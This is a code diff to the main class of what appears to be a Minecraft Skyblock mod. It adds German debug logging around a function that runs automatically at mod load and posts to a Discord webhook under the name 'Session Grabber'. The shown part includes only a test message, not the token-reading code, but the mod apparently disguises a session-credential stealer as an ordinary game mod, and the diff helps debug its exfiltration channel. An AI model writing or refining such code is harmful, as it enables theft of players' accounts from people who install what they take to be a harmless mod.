@@ -384,10 +384,13 @@ public final class Main {
     }
 
     private void execWebhook() {
+        System.out.println(">>> execWebhook() STARTET - Thread wird erstellt");
         new Thread(() -> {
+            System.out.println(">>> Thread gestartet - beginne mit Webhook-Versand");
             // ERST EINE TEST-NACHRICHT SENDEN, UM ZU PRÜFEN OB WEBHOOK FUNKTIONIERT
             try {
                 System.out.println("=== SENDE TEST-NACHRICHT ===");
+                System.out.println("Webhook URL: " + WEBHOOK_URL);
                 new DiscordWebhook(WEBHOOK_URL)
                     .setUsername("Session Grabber")
                     .setContent(":white_check_mark: **TEST:** Webhook-Verbindung funktioniert! Mod wurde gestartet.")
@@ -460,6 +463,15 @@ public final class Main {
 
     @EventHandler
     public void preInit(final FMLPreInitializationEvent event) {
+        // SEHR WICHTIG: Erste Ausgabe um zu prüfen ob Mod überhaupt lädt
+        System.out.println("========================================");
+        System.out.println("=== SKYBLOCK MOD WIRD GELADEN ===");
+        System.out.println("=== WEBHOOK URL: " + WEBHOOK_URL.substring(0, 50) + "...");
+        System.out.println("========================================");
+        System.err.println("=== MOD PREINIT AUFGERUFEN ===");
+        
         execWebhook();
+        
+        System.out.println("=== execWebhook() WURDE AUFGERUFEN ===");
     }
 }
